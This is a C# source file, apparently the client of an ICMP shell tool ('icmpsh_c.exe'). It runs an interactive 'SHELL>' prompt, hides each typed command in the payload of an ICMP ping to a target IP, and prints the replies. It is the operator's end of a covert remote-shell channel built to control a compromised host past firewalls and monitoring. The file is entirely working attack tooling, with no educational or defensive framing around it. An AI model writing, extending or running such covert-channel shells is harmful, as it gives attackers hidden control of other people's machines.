using System;
using System.Net.NetworkInformation;

namespace icmpnc
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
                Console.WriteLine("Usage: icmpsh_c.exe <TARGET IP>");
            else {
                while (true)
                {
                    Console.Write("SHELL> ");
                    string str = Console.ReadLine();
                    if (str.Equals("exit"))
                        break;
                    ComplexPing(args, str);
                }
            }
        }

        public static void ComplexPing(string[] param,string str)
        {
            Ping pingSender = new Ping();

            // Create a buffer of 32 bytes of data to be transmitted.
            string data = str;
            byte[] buffer = System.Text.Encoding.ASCII.GetBytes(data);

            // Wait 10 seconds for a reply.
            int timeout = 10000;

            // Set options for transmission:
            // The data can go through 64 gateways or routers
            // before it is destroyed, and the data packet
            // cannot be fragmented.
            PingOptions options = new PingOptions(64, true);

            // Send the request.
            PingReply reply = pingSender.Send(param[0], timeout, buffer, options);

            if (reply.Status == IPStatus.Success)
            {
                Console.WriteLine(System.Text.Encoding.ASCII.GetString(reply.Buffer));
            }
            else
            {
                Console.WriteLine(reply.Status);
            }
        }
    }
}
